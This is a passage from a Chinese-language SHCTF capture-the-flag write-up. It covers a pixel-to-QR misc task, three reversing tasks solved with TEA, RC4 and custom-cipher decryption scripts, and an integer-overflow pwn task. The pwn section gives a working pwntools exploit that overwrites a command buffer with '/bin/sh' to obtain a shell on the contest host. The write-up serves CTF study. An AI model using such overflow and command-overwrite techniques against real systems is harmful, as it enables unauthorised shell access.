        pixel_data = [(int(r), int(g), int(b)) for r, g, b in pixels]
        
        total_pixels = len(pixel_data)
        if total_pixels == 0:
            print("错误！！！")
            return

        print(f"总像素点数量:{total_pixels}")


        width = int(math.sqrt(total_pixels))
        while total_pixels % width != 0:
            width -= 1
        height = total_pixels // width
        
        print(f"可能的图像尺寸: {width} x {height}")

        img = Image.new('RGB', (width, height))
        img.putdata(pixel_data)
        
        img.save(output_name)
        print(f"图片已保存为: {output_name}")

    except FileNotFoundError:
        print(f"找不到文件，请确认路径:{file_path}")
    except Exception as e:
        print(f"错误: {e}")

if __name__ == "__main__":
    target_path = r'flag.txt'
    solve_pixel_challenge(target_path)
```

得到一张二维码，qr一下得到U0hDVEZ7VGgzX1F1ZXN0MW9uNV9BcmVfVG9vX0QxZmZpY3UxdCEhISF9，扔给赛博厨子。

**得到flag：SHCTF{Th3_Quest1on5_Are_Too_D1fficu1t!!!!}**

---

---

---

## #逆向:

### 1.**Challenge Info** **-** **[阶段1] a_cup_of_tea**

看题目表示就是指TEA加密喽。

程序通过 `scanf("%16s", src)` 获取输入，并检查长度是否为 16 位。

随后调用 `sub_1241`：

```
void __fastcall sub_1241(__int64 a1, __int64 a2)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 15; ++i )
    *(_DWORD *)(4LL * (i / 4) + a1) += *(char *)(i + a2) << (8 * (i % 4));
}
```

输入的字符串转换成 4 个 32 位无符号整数。

 `sub_134E` 中存在tea加密：

```
__int64 __fastcall sub_134E(unsigned int *a1, _DWORD *a2)
{
  unsigned int v3; // [rsp+1Ch] [rbp-24h]
  unsigned int v4; // [rsp+20h] [rbp-20h]
  int v5; // [rsp+24h] [rbp-1Ch]
  unsigned int i; // [rsp+28h] [rbp-18h]

  v3 = *a1;
  v4 = a1[1];
  v5 = 0;
  for ( i = 0; i <= 0x1F; ++i )
  {
    v5 -= 1640531527;
    v3 += (v4 + v5) ^ (16 * v4 + *a2) ^ ((v4 >> 5) + a2[1]);
    v4 += (v3 + v5) ^ (16 * v3 + a2[2]) ^ ((v3 >> 5) + a2[3]);
  }
  *a1 = v3;
  a1[1] = v4;
  return v4;
}
```

$$v_0 += ((v_1 << 4) + k_0) \oplus (v_1 + sum) \oplus ((v_1 >> 5) + k_1)$$

$$v_1 += ((v_0 << 4) + k_2) \oplus (v_0 + sum) \oplus ((v_0 >> 5) + k_3)$$

函数 `sub_1439` 中存在：

```
_BOOL8 __fastcall sub_1439(unsigned int *a1)
{
  sub_134E(a1, aWelcomeToShctf_0);
  if ( *a1 != -1699360031 || a1[1] != -1120419751 )
    return 0;
  sub_134E(a1 + 2, aWelcomeToShctf_0);
  return a1[2] == -1515845715 && a1[3] == -1804683212;
}
```

追溯一下得到密钥与密文：

key：`"welcome_to_SHCTF"`

密文：

`0x9AB5D2E1`, `0xBD37C059`

`0xA5A607AD`, `0x946EB834`

#### EXP：

```
import struct

def decrypt(v, k):
    v0, v1 = v[0], v[1]
    k0, k1, k2, k3 = k[0], k[1], k[2], k[3]
    delta = 0x9E3779B9
    s = (delta * 32) & 0xFFFFFFFF
    
    for i in range(32):
        v1 = (v1 - (((v0 << 4) + k2) ^ (v0 + s) ^ ((v0 >> 5) + k3))) & 0xFFFFFFFF
        v0 = (v0 - (((v1 << 4) + k0) ^ (v1 + s) ^ ((v1 >> 5) + k1))) & 0xFFFFFFFF
        s = (s - delta) & 0xFFFFFFFF
        
    return v0, v1

key_str = b"welcome_to_SHCTF"
key = struct.unpack("<4I", key_str)

encrypted_blocks = [
    (0x9AB5D2E1, 0xBD37C059),
    (0xA5A607AD, 0x946EB834)
]

flag_body = ""
for block in encrypted_blocks:
    res = decrypt(block, key)
    flag_body += struct.pack("<2I", *res).decode()

print(f"{flag_body}")
print(f"Flag: SHCTF{{{flag_body}}}")
```

**得到flag：SHCTF{W0w_u_kN0w_t3A!!}**

---



### 2.**Challenge Info** **-** **[阶段1] where are you**

程序运行后回显 "Please input the flag:" ，并获取输入。

`sub_401FE0` 函数：

```
for ( i = 0; i < 24; ++i ) {
    if ( (input[i] ^ 0x22) != byte_4031F8[i] )
        return "Wrong Flag!";
}
```

这是一个陷阱函数，回显假flag。

程序深层包含一个 TLS 回调函数 `TlsCallback_0`（地址 `0x402210`），它会在 `main` 函数执行前运行。

完成操作：

1.将 `0x402090` 地址处的数据与 `0xC2` 进行异或。

```
for ( i = 0; i < dwSize; ++i )
    lpAddress[i] ^= 0xC2;
```

即rc4加密函数。

2.使用 `VirtualProtect` 修改内存权限，并在原本的检查函数 `sub_401FE0` 开头写入一个 `JMP` 指令，跳转到刚才解密出的 `0x402090` 处执行。

3.使用硬编码 `MyS3cr3tS33d` 生成 RC4 密钥。

```
seed = "MyS3cr3tS33d";
for ( i = 0; i < 16; ++i )
    rc4_key[i] = (seed[i % 12] ^ 0xAA) + (i * 7);
```

静态分析几次后，寻找一下密文。

逆一下rc4，就出来了。

#### EXP:

```
def rc4_decrypt(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    res = []
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        res.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(res)

seed = b"MyS3cr3tS33d"
key = []
for i in range(16):
    val = (seed[i % 12] ^ 0xAA) + (i * 7)
    key.append(val & 0xFF)

ciphertext = [
    0xEA, 0x64, 0x65, 0x15, 0xFF, 0x0A, 0xAD, 0x41, 0x6F, 0x81, 0xA1, 0x7B,
    0xA8, 0xD0, 0x5E, 0x69, 0x74, 0x92, 0x6A, 0xE3, 0xBD, 0x6B, 0x33, 0x97,
    0x2D, 0xC2, 0xB5, 0xFA, 0xD0, 0x8F, 0x6D, 0x3F, 0xAD, 0x00, 0xD0, 0x91
]

flag = rc4_decrypt(ciphertext, key)
print(f"Flag:{flag.decode()}")
```

**得到flag：SHCTF{you_found_me_and_TLS_callback}**

---



### 2.Challenge Info - [阶段3] strange_chain

输入会采用 PKCS#7 标准将数据填充至 8 字节的倍数（40字节）。核心函数逻辑位于 `sub_140001A90`。

程序并不直接调用子函数，而是通过 `sub_140001410` 在运行时动态申请构建指令流：

使用 `VirtualAlloc` 申请内存，在内存中写入 `48 B8 [8字节地址] FF E0`（即 `MOV RAX, <sub_func_addr>; JMP RAX`）。

形成了一条由八个函数串联起来的函数链。

此外：程序在拼接逻辑中插入了  `ThreadHideFromDebugger` 检测，似乎存在动态调试的防御措施。(反正我也不会其实)

整体加密过程：

**1. 轮函数**

每一轮的执行顺序由内部的 `e-z-e-z-e-z-r-e` 决定：

- **F 函数**：$F(v) = (v + (ROL(v, 5) \oplus ROL(v, 13))) \pmod{2^{32}}$
- **e **：将当前侧数据与 F 的另一侧进行异或，并且叠加轮密钥 $K$
- **z **：根据位移按数组 $S$ 进行动态循环移位：$ROL(Data, (S[i] \oplus \text{另一侧}) \& 0x1F)$
- **r **：每 3 轮执行一次左右半部分数据交换。

**2. 动态常量生成 **

轮密钥 $K$ 和位移常数 $S$ 由 `sub_140002980` 生成。它是基于一个硬编码，通过算法在内存中填充。

**思路：**

通过**(好像是)**过掉反调试拿到生成的 $K$ 数组和 $S$ 数组。(我的x64dbg没有隐藏的插件，但没出问题，不知道为什么)

按照 `e-z-e-z-e-z-r-e` 的顺序执行逆运算，从第 12 轮逆推，得到flag。

**EXP:**

```
import struct

def rol(v, n):
    return ((v << n) & 0xFFFFFFFF) | (v >> (32 - n))

def ror(v, n):
    n &= 0x1F
    return (v >> n) | ((v << (32 - n)) & 0xFFFFFFFF)

def f_func(v):
    return (v + (rol(v, 5) ^ rol(v, 13))) & 0xFFFFFFFF

S = [0x950C6CF1, 0x8BC2D031, 0xEE6ABBA4, 0x4C5DF953, 0xC8BCC1D1, 0x67164321, 0x4CCDE11F, 0x47E4B2D6, 0xF00A942E, 0x94148A29, 0xA6BE90AB, 0x10D6519C, 0xC09E7A48, 0x946FEB92]
K = [0x9E3779B9, 0x7CAF18F1, 0x04C080A4, 0x17A8D338, 0x5A645F7E, 0x3F639A86, 0x6F7A67D3, 0x7CAF18F1, 0x17A8D338, 0x3F639A86, 0x04C080A4, 0x17A8D338, 0x5A645F7E, 0x3F639A86, 0x6F7A67D3, 0x7CAF18F1, 0x17A8D338, 0x3F639A86, 0x04C080A4, 0x17A8D338, 0x5A645F7E, 0x3F639A86, 0x6F7A67D3, 0x7CAF18F1, 0x17A8D338, 0x3F639A86]

cipher = [
    (0x871DC02B, 0x9C6484E5), (0x18BBD956, 0x41F17A4E),
    (0x1693BFD5, 0xF3565E7B), (0xE5BA95C5, 0xCC8AC8BD),
    (0xB4B69055, 0x291E3DBC)
]

def decrypt_block(L, R):
    for i in range(12, 0, -1):
        if i % 3 == 0: L, R = R, L 
        R = ror(R, (S[i] ^ L) & 0x1F)
        R = (R - K[2 * i + 1]) & 0xFFFFFFFF
        R ^= f_func(L)
        L = ror(L, (S[i] ^ R) & 0x1F)
        L = (L - K[2 * i]) & 0xFFFFFFFF
        L ^= f_func(R)
    R = (R - (S[0] ^ K[1])) & 0xFFFFFFFF
    L = (L - (S[0] ^ K[0])) & 0xFFFFFFFF
    return L, R

full_flag = b""
for l, r in cipher:
    o_l, o_r = decrypt_block(l, r)
    full_flag += struct.pack("<II", o_l, o_r)

print(f"Flag: {full_flag.decode('ascii', errors='ignore')}")
```

**得到flag：SHCTF{Have1ng_a_go0d_t1me_O_o_Hu!}**

---

---

---

## #PWN：

你就是我的唯一：

### **Challenge Info** **-** **[阶段1] int_overflow**

基本不会pwn，只会hyw，溢出之类的简单。



题目是一个整数溢出，通过整数溢出并进一步触发栈溢出。

`main` 函数中通过一个循环读取两次输入：

使用 `scanf("%d")` 读取，并检查输入是否满足 $\leq 9$；如果输入大于 9，程序直接退出。

由于检查使用的是有符号比较（`jle`），可以通过输入负数绕过限制。

变量 `var_11` 在栈上只有8字节，范围为 $0 \sim 255$

通过输入 `-156 `可以触发 8 位整数溢出，从而进入 `backdoor`。

`backdoor` 将传入的参数（即溢出后的 100）减去 $0x50$（80），得到 `read` 函数的读取长度为20字节。

缓冲区 `buf` 位于 `[rbp-1Dh]`。命令字符串 `command` 位于 `[rbp-13h]`，初始值为 `echo hello`。

从 `buf` 到 `command` 的距离为 $0x1D - 0x13 = 10$ 字节。通过 `read` 读入的 20 字节数据可以轻松覆盖掉后面的 `command` 变量。

思路：

1. 在 `main` 函数中先后输入 `-156` 和 `0`。此时 `var_11` 经过 截断后变为 $0x64$（即 100），成功绕过，后调用 `backdoor` 函数。
2. 利用 `backdoor` 中的 `read` 函数，构造 `10字节填充 + "/bin/sh\x00"` 的 Payload。程序后续调用 `system(command)` 时，实际执行的是 `system("/bin/sh")`，从而得到shell。

#### **EXP:**

Python

```
from pwn import *

p = remote('challenge.shc.tf', 端口)

log.info("Sending integers to bypass logic check...")
p.sendlineafter(b"plz input number1", b"-156")
p.sendlineafter(b"plz input number2", b"0")

log.info("覆盖中...")
payload = b"A" * 10 + b"/bin/sh\x00"

p.sendlineafter(b"what is your name", payload)

p.success("Exploit sent! Shell popping...")
p.interactive()
```

拿到shell执行ls；cat flag；

**得到 Flag：`SHCTF{98af0823-ea1f-4645-99d5-c242c825973c}`**



---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
